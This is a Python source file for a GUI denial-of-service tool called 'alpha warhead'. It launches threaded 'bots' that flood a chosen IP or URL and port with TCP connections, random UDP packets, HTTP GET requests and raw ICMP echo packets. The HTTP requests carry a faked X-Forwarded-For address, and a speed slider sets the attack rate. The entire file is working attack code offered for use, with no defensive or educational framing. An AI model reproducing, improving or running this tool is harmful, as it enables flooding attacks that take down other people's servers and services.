import os
import threading
import socket
import random
import requests
import time
import tkinter as tk
from tkinter import messagebox
import struct

attack_counts = {}
total_requests = 0
target_ip = ""
target_port = 0
attack_type = ""
num_bots = 0
attack_speed = 0.5 
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def get_ip_from_url(url):
    try:
        ip = socket.gethostbyname(url)
        return ip
    except socket.gaierror:
        messagebox.showerror("Error", f"Unable to resolve IP address for {url}")
        return None

def checksum(source_string):
    sum = 0
    count_to = (len(source_string) // 2) * 2
    count = 0
    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff
        count = count + 2
    if count_to < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def create_icmp_packet():
    packet_type = 8
    code = 0
    checksum_value = 0
    identifier = random.randint(0, 0xFFFF)
    sequence_number = random.randint(0, 0xFFFF)
    header = struct.pack('bbHHh', packet_type, code, checksum_value, identifier, sequence_number)
    data = struct.pack('d', time.time())
    checksum_value = checksum(header + data)
    header = struct.pack('bbHHh', packet_type, code, checksum_value, identifier, sequence_number)
    return header + data

def attack(target_ip, target_port, bot_id, attack_type, fake_ip):
    global total_requests
    attack_count = 0
    while True:
        try:
            if attack_type == "TCP":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            elif attack_type == "UDP":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            elif attack_type == "HTTP":
                url = f"http://{target_ip}:{target_port}"
                headers = {"X-Forwarded-For": fake_ip}
                response = requests.get(url, headers=headers)
                print(f"HTTP attack sent by bot {bot_id} to {url} with response code {response.status_code}")
                continue
            elif attack_type == "VOLUMETRIC":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = random._urandom(1024)
                s.sendto(packet, (target_ip, target_port))
                print(f"Volumetric attack sent by bot {bot_id} to {target_ip} on port {target_port}")
                continue
            elif attack_type == "ANTI_SYSTEM_ATTACK":
                while True:
                    start_time = time.time()
                    end_time = start_time + 10
                    while time.time() < end_time:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        packet = random._urandom(1024)
                        s.sendto(packet, (target_ip, target_port))
                        s.close()
                        attack_count += 1
                        total_requests += 1
                        attack_counts[bot_id] = attack_count
                        print(f"Bot {bot_id} ({fake_ip}) anti-system attack sent to {target_ip} on port {target_port}")
                        time.sleep(1.0 / attack_speed)  # Ajustar la velocidad de ataque
                    time.sleep(7)
                continue
            elif attack_type == "LOCKER":
                ip = get_ip_from_url(target_ip)
                if ip:
                    confirm = messagebox.askyesno("Confirm", f"Do you want to attack IP {ip}?")
                    if confirm:
                        target_ip = ip
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        packet = random._urandom(1024)
                        s.sendto(packet, (target_ip, target_port))
                        print(f"Locker attack sent by bot {bot_id} to {target_ip} on port {target_port}")
                        attack_count += 1
                        total_requests += 1
                        attack_counts[bot_id] = attack_count
                    else:
                        print("Attack canceled.")
                continue
            elif attack_type == "ICMP":
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                packet = create_icmp_packet()
                s.sendto(packet, (target_ip, 1))
                print(f"ICMP attack sent by bot {bot_id} to {target_ip}")
                attack_count += 1
                total_requests += 1
                attack_counts[bot_id] = attack_count
                s.close()
                continue
            else:
                messagebox.showerror("Invalid Attack Type", "Please choose TCP, UDP, HTTP, VOLUMETRIC, ANTI_SYSTEM_ATTACK, ICMP.")
                return

            if attack_type == "TCP":
                s.connect((target_ip, target_port))
                s.send(b"GET / HTTP/1.1\r\n\r\n")
            elif attack_type == "UDP":
                s.sendto(b"GET /", (target_ip, target_port))

            attack_count += 1
            total_requests += 1
            attack_counts[bot_id] = attack_count
            print(f"Bot {bot_id} ({fake_ip}) attack sent to {target_ip} on port {target_port} using {attack_type} attack")

            s.close()
            time.sleep(1.0 / attack_speed)  # Ajustar la velocidad de ataque
        except Exception as e:
            print("Error:", e)
            break

def display_banner():
    banner = r'''                                                                 
                                                                                                      
                                                                                                              
                                                                                                              
                                           ███                                                                
                                          ███             ███████████████████████████████                            
                               ████████████████████████████████████████████████████████████████████████████   
                         ███████████████████████████████▒▒▒█    █▒▒▒▒▒███████████████████████████████████▒    
                    ██████████████████████████      █████████████████████████████████▓▓▓▓▓▓██████████████▒    
                                         █████████████████████████████████████████              ██████████░    
                                         ███████████                  ▓████████                                
                                       ███████████████████████████████████    █                   _____    ___  
                  ████████████████████████████████████████████████████ ▓ ██████           /\     |  __ \  |__ \ 
                     ███████████████████████░ ████                     ████▒   █         /  \    | |__) |    ) |
                                         ▒██  ███                         ██████        / /\ \   |  _  /    / / 
                                         █    ███                          █████       / ____ \  | | \ \   / /_ 
                                         ▓███████                                     /_/    \_\ |_|  \_\ |____| 
                                          ██████                                                                 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
'''
    print("\033[91m" + banner + "\033[0m")

def create_attacks():
    global target_ip, target_port, attack_type, num_bots
    threads = []
    for i in range(num_bots):
        fake_ip = generate_fake_ip()
        thread = threading.Thread(target=attack, args=(target_ip, target_port, i+1, attack_type, fake_ip))
        thread.start()
        threads.append(thread)
    return threads

def start_attack():
    global target_ip, target_port, attack_type, num_bots
    target_ip = ip_entry.get()
    target_port = int(port_entry.get())
    attack_type = attack_type_var.get()
    num_bots = int(bots_entry.get())
    create_attacks()

def display_information():
    global target_ip, target_port, attack_type, num_bots
    info_text.delete(1.0, tk.END)
    info_text.insert(tk.END, f"Target : {target_ip} {target_port}\n")
    info_text.insert(tk.END, f"Total Requests: {total_requests}\n")
    info_text.insert(tk.END, f"Attack Type and number of bots: {attack_type} {num_bots}\n")
    info_text.insert(tk.END, "Bot Attack Counts:\n")
    for bot_id, count in attack_counts.items():
        info_text.insert(tk.END, f"Bot {bot_id}: {count} attacks\n")
    info_text.after(1, display_information)  # Actualizar cada segundo

def update_attack_speed(val):
    global attack_speed
    attack_speed = float(val)

def create_gui():
    global ip_entry, port_entry, attack_type_var, bots_entry, info_text

    root = tk.Tk()
    root.title("alpha warhead")
    root.configure(bg="black")

    # Crear un frame principal
    main_frame = tk.Frame(root, bg="black", padx=20, pady=20)
    main_frame.pack(side="left", anchor="n", fill="both", expand=True)

    title_label = tk.Label(main_frame, text="alpha warhead", font=("Helvetica", 24), fg="#ff0000", bg="black")
    title_label.pack(pady=10, anchor="center")

    ip_label = tk.Label(main_frame, text="Target IP or URL:", font=("Helvetica", 14), fg="#FF0000", bg="black")
    ip_label.pack(pady=5, anchor="w")
    ip_entry = tk.Entry(main_frame, font=("Helvetica", 14), bg="black", fg="#FF0000", insertbackground="white")
    ip_entry.pack(pady=5, anchor="w")

    port_label = tk.Label(main_frame, text="Target Port:", font=("Helvetica", 14), fg="#FF0000", bg="black")
    port_label.pack(pady=5, anchor="w")
    port_entry = tk.Entry(main_frame, font=("Helvetica", 14), bg="black", fg="#FF0000", insertbackground="white")
    port_entry.pack(pady=5, anchor="w")

    attack_type_label = tk.Label(main_frame, text="Attack Type:", font=("Helvetica", 14), fg="#FF0000", bg="black")
    attack_type_label.pack(pady=5, anchor="w")
    attack_type_var = tk.StringVar(value="TCP")
    attack_types = ["TCP", "UDP", "HTTP", "VOLUMETRIC", "ANTI_SYSTEM_ATTACK", "ICMP"]
    attack_type_menu = tk.OptionMenu(main_frame, attack_type_var, *attack_types)
    attack_type_menu.config(font=("Helvetica", 14), bg="black", fg="#FF0000")
    attack_type_menu["menu"].config(font=("Helvetica", 14), bg="black", fg="#FF0000")
    attack_type_menu.pack(pady=5, anchor="w")

    bots_label = tk.Label(main_frame, text="Number of Bots:", font=("Helvetica", 14), fg="#FF0000", bg="black")
    bots_label.pack(pady=5, anchor="w")
    bots_entry = tk.Entry(main_frame, font=("Helvetica", 14), bg="black", fg="#FF0000", insertbackground="white")
    bots_entry.pack(pady=5, anchor="w")

    speed_label = tk.Label(main_frame, text="Attack Speed:", font=("Helvetica", 14), fg="#FF0000", bg="black")
    speed_label.pack(pady=5, anchor="w")

    speed_scale = tk.Scale(main_frame, from_=0.5, to=10.0, resolution=0.1, orient=tk.HORIZONTAL, length=300, command=update_attack_speed)
    speed_scale.config(font=("Helvetica", 14), bg="black", fg="#FF0000")
    speed_scale.pack(pady=5, anchor="w")

    start_button = tk.Button(main_frame, text="Start Attack", font=("Helvetica", 14), command=start_attack, bg="black", fg="#FF0000")
    start_button.pack(pady=10, anchor="w")

    info_button = tk.Button(main_frame, text="Display Information", font=("Helvetica", 14), command=display_information, bg="black", fg="#FF0000")
    info_button.pack(pady=10, anchor="w")

    info_text = tk.Text(main_frame, font=("Helvetica", 14), bg="black", fg="#FF0000", height=90, width=30)  # Incrementar tamaño del área de texto
    info_text.pack(pady=1, anchor="w")

    root.mainloop()

if __name__ == "__main__":
    display_banner()
    create_gui()
